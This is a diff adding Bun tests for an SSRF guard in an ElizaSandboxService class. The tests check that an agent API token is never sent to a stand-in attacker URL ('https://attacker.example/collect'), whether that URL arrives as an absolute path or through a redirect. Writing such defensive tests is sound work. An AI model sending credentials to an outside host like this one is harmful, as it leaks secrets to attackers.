@@ -14,9 +14,12 @@
  * The string branch is self-contained (no provider / DB), so this exercises the
  * real method directly.
  */
-import { describe, expect, test } from "bun:test";
+import { afterEach, describe, expect, mock, test } from "bun:test";
 
-import { ElizaSandboxService } from "./eliza-sandbox";
+import { runWithCloudBindings } from "../runtime/cloud-bindings";
+
+// Match the main sandbox suite's module identity; Bun treats query aliases as separate modules.
+const { ElizaSandboxService } = await import("./eliza-sandbox.ts?actual");
 
 type BridgeEndpointResolver = {
   getSafeBridgeEndpoint(
@@ -25,6 +28,22 @@ type BridgeEndpointResolver = {
     options?: { trusted?: boolean },
   ): Promise<string>;
 };
+
+type AgentApiFetcher = {
+  fetchAgentApi(rec: Record<string, unknown>, path: string, init?: RequestInit): Promise<Response>;
+};
+
+const originalFetch = globalThis.fetch;
+const originalWebSocketPair = Object.getOwnPropertyDescriptor(globalThis, "WebSocketPair");
+
+afterEach(() => {
+  globalThis.fetch = originalFetch;
+  if (originalWebSocketPair) {
+    Object.defineProperty(globalThis, "WebSocketPair", originalWebSocketPair);
+  } else {
+    Reflect.deleteProperty(globalThis, "WebSocketPair");
+  }
+});
 
 function resolver(): BridgeEndpointResolver {
   return new ElizaSandboxService() as unknown as BridgeEndpointResolver;
@@ -55,5 +74,73 @@ describe("ElizaSandboxService bridge SSRF guard (untrusted string bridge URL)", 
         trusted: true,
       }),
     ).resolves.toBe("http://10.0.0.7:7000/api/restore");
+  });
+
+  test("rejects an absolute Worker API path before the agent token can leave", async () => {
+    Object.defineProperty(globalThis, "WebSocketPair", {
+      value: class WebSocketPair {},
+      configurable: true,
+    });
+    const fetchMock = mock(async () => Response.json({ ok: true }));
+    globalThis.fetch = fetchMock;
+    const service = new ElizaSandboxService() as unknown as AgentApiFetcher;
+
+    await expect(
+      runWithCloudBindings(
+        {
+          ELIZA_CLOUD_AGENT_BASE_DOMAIN: "elizacloud.ai",
+          AGENT_ROUTER_ORIGIN_HOST: "eliza-production-1.elizacloud.ai",
+        },
+        () =>
+          service.fetchAgentApi(
+            {
+              id: "e06bb509-6c52-4c33-a9f7-66addc43e8c8",
+              environment_vars: { ELIZA_API_TOKEN: "agent-token" },
+            },
+            "https://attacker.example/collect",
+          ),
+      ),
+    ).rejects.toThrow("Agent API path must be relative to the agent origin");
+    expect(fetchMock).not.toHaveBeenCalled();
+  });
+
+  test("never follows a redirect from the configured token recipient", async () => {
+    Object.defineProperty(globalThis, "WebSocketPair", {
+      value: class WebSocketPair {},
+      configurable: true,
+    });
+    const requests: Array<{ url: string; redirect: RequestRedirect | undefined }> = [];
+    globalThis.fetch = mock(async (input: RequestInfo | URL, init?: RequestInit) => {
+      requests.push({
+        url: typeof input === "string" ? input : input.toString(),
+        redirect: init?.redirect,
+      });
+      return Response.redirect("https://attacker.example/collect", 302);
+    });
+    const service = new ElizaSandboxService() as unknown as AgentApiFetcher;
+
+    const response = await runWithCloudBindings(
+      {
+        ELIZA_CLOUD_AGENT_BASE_DOMAIN: "elizacloud.ai",
+        AGENT_ROUTER_ORIGIN_HOST: "eliza-production-1.elizacloud.ai",
+      },
+      () =>
+        service.fetchAgentApi(
+          {
+            id: "e06bb509-6c52-4c33-a9f7-66addc43e8c8",
+            environment_vars: { ELIZA_API_TOKEN: "agent-token" },
+          },
+          "/api/agents",
+          { redirect: "follow" },
+        ),
+    );
+
+    expect(response.status).toBe(302);
+    expect(requests).toEqual([
+      {
+        url: "https://eliza-production-1.elizacloud.ai/api/agents",
+        redirect: "manual",
+      },
+    ]);
   });
 });
